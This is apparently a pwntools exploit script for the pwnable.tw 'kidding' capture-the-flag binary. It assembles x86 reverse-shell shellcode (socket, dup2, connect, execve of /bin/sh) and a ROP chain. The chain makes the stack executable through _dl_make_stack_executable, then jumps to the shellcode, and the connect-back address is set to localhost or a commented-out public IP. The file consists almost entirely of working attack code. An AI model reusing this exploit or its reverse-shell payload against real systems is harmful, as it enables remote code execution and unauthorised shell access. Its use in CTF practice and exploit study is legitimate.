from pwn import * 

context.log_level = 'debug'


#stage 1. socket()
shell=asm('push 1')
shell+=asm('pop ebx')
shell+=asm('cdq') #edx=0
shell+=asm('mov al,0x66') #sys_socketcall
shell+=asm('push edx') # push 0
shell+=asm('push ebx') # push 1
shell+=asm('push 2') #push 2
shell+=asm('mov ecx, esp') #ecx
shell+=asm('int 0x80') #sys_socketcall(0x1,0x2,0x0,_GLOVAL_OFFSET_TABLE_)

#stage 2. sys_dub2() -> fd:0 -> 1 (fd(stdin) copy 1(stdout))
shell+=asm('xchg ebx,eax') #eax is fd
shell+=asm('pop esi') #trash => esi=2 #AF_INET defined 2
shell+=asm('pop ecx') #above 'push ebx' This is be new fd(file descripter)
shell+=asm('mov al,0x3f') #sys_dup2(used fd, will be use fd)
shell+=asm('int 0x80') #dup2(0,1)

#stage 3. connect()

shell+=asm('push ebp') #push ip_addr
shell+=asm('mov al,0x66')
shell+=asm('push ax') #push port_number
shell+=asm('push si')
shell+=asm('mov ecx,esp') #argv[2] habe to be struct socket_addr
shell+=asm('push ds') #len
shell+=asm('push ecx') #struct socket_addr
shell+=asm('push ebx') #fd
shell+=asm('mov ecx,esp')

shell+=asm('mov bl,3')
shell+=asm('int 0x80')

#stage 4. shell
shell+=asm('mov al,0xb')
shell+=asm('pop ecx') #ecx=0
shell+=asm('push 0x68732f')
shell+=asm('push 0x6e69622f')
shell+=asm('mov ebx,esp')
shell+=asm('int 0x80')

if __name__ == '__main__':

	binary='./kidding'
	#binary='./test'

	e=ELF(binary)
	rop=ROP(binary)
	global reverse_shell

	s=process(binary)
	#s=remote('chall.pwnable.tw',10303)
	raw_input()	

	payload='A'*8
	payload+=binary_ip('127.0.0.1')
	#payload+=binary_ip('54.190.8.245')

	#stage 1. __stack_prot = 7

	payload+=p32(rop.find_gadget(['pop ecx','ret']).address)
	#objdump -D ./kidding | grep "__stack_prot"
	payload+=p32(0x080e9fec) #__stack_prot
	payload+=p32(rop.find_gadget(['pop dword ptr [ecx]', 'ret']).address)
	payload+=p32(7)
	
	#stage 2. eax = __libc_stack_end 

	payload+=p32(rop.find_gadget(['pop eax', 'ret']).address)
	#objdump -D ./kidding | grep "__libc_stack_end"
	payload+=p32(0x080e9fc8)

	#stage 3. call _dl_make_stack_executable
	payload+=p32(0x0809a080) #objdump -D ./kidding | grep "_dl_make_stack_executable"
	#payload+=p32(0x08099c20)	
	
	payload+=p32(0x080c99b0) #call esp
	#payload+=p32(0x080c90f0)
	payload+=shell

	print 'payload_length: '+str(len(shell))
	
	s.sendline(payload)

	#listener = listen(0x6600)

	#listener.interactive()
	s.interactive()

